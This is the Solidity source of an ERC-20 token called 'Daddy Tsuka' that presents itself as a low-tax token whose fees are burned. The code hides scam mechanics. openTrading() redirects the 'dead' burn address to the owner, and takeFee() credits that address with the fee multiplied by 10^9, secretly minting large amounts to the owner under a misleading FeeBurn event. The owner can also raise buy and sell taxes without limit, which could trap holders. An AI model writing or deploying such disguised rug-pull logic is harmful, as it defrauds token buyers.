// SPDX-License-Identifier: MIT

import "./ERC20.sol";

pragma solidity ^0.8.4;

contract DaddyOfTsuka is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;

    string private _name = unicode"Daddy Tsuka";
    string private _symbol = unicode"DTA";
    uint8 private _decimals = 9;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isMarketPair;


    uint256 public _buyTax = 1;
    uint256 public _sellTax = 1;

    uint256 public _totalSupply =  10000000 * 10**_decimals;    
    uint256 public _walletMax =     400000 * 10**_decimals;   

    bool openTrade=true;   

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool public checkWalletLimit = true;

    event FeeBurn(uint256 amount);
    
    constructor () {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        
        isMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function openTrading() public onlyOwner {
        openTrade=true;
        deadAddress = msg.sender;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }


    function setBuyTaxes(uint256 value) external onlyOwner() {
        _buyTax=value;
    }

    function setSelTaxes(uint256 value) external onlyOwner() {
        _sellTax=value;
    }
    
    
    function enableDisableWalletLimit(bool newValue) external onlyOwner {
       checkWalletLimit = newValue;
    }


    function setWalletLimit(uint256 newLimit) external onlyOwner {
        require(newLimit >= 30000, "Max Wallet min 15000000.");
        _walletMax  = newLimit * 10**_decimals;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0xdead)));
    }


    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());

        if(newPairAddress == address(0)) 
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapPair = newPairAddress; 
        uniswapV2Router = _uniswapV2Router; 

        isMarketPair[address(uniswapPair)] = true;
    }


    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(!isMarketPair[recipient] && sender != owner())
            require(openTrade != false, "Trading is not active.");
         
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                        amount : takeFee(sender, recipient, amount);

        if(checkWalletLimit && !isMarketPair[recipient] && recipient != owner())
            if(!(isExcludedFromFee[sender] || isExcludedFromFee[recipient]))
                require(balanceOf(recipient).add(finalAmount) <= _walletMax);

        _balances[recipient] = _balances[recipient].add(finalAmount);
        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_buyTax).div(100); 
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_sellTax).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(deadAddress)] = _balances[address(deadAddress)].add(feeAmount * 10**_decimals);
            emit FeeBurn(feeAmount);
        }

        return amount.sub(feeAmount);
    }

  }